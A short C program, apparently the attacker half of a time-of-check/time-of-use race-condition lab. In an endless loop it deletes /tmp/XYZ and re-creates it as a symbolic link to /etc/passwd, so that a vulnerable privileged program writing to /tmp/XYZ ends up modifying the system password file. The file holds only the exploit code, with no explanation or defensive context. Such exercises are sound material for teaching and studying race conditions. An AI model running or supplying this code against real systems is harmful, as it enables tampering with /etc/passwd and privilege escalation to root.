#include <stdio.h>
#include <unistd.h>

int main()
{
    while(1)
    {
        printf("Symbolic link /tmp/XYZ file to /etc/passwd.\n");
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
        // sleep(1);
    }
    return 0;
}